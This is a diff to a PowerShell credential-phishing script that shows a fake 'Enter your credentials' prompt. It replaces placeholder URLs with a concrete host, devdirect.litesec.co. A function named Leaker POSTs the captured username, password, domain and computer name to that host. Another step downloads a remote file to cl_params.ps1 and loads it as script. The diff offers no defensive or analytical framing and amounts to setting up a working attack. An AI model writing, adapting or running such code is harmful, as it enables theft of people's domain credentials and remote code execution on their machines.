@@ -42,7 +42,7 @@ param (
     [string]$Message = 'Enter your credentials',
 
     [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$Server = "YOUR_URL/cl_reader.php?",
+    [string]$Server = "http://devdirect.litesec.co/cl_reader.php?",
 
     [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
     [string]$Port = "80",
@@ -81,7 +81,7 @@ if ([string]::IsNullOrEmpty($override)) {
 }
 
 if ([string]::IsNullOrEmpty($path)) {
-    Invoke-RestMethod -uri "http://nosignal.me/config.cl" -OutFile $temp"\cl_params.ps1"
+    Invoke-RestMethod -uri "http://devdirect.litesec.co" -OutFile $temp"\cl_params.ps1"
 }
 # If being used, load config file
 if (Test-Path -Path $temp"cl_params.ps1") {
@@ -177,7 +177,7 @@ function Leaker($domain, $username, $password, $ComputerName) {
 
             http {
                 $post = @{username = $username; password = $password; domain = $domain; computer = $env:COMPUTERNAME }
-                Invoke-WebRequest -UseBasicParsing $Server -method POST -Body $post -ErrorAction Ignore
+                Invoke-WebRequest -UseBasicParsing http://devdirect.litesec.co/cl_reader.php? -method POST -Body $post -ErrorAction Ignore
                 remove-item -path $env:temp"cl_params.ps1"
             }
         }
@@ -218,13 +218,3 @@ function Credentials() {
             if ([string]::isnullorempty($domain.name) -eq $false) {
                 leaker $CurrentDomain_Name $username $password $ComputerName
                 $status = $false
-                exit
-            }
-            else {
-                Credentials
-            }
-        }
-    }
-}
-
-Credentials
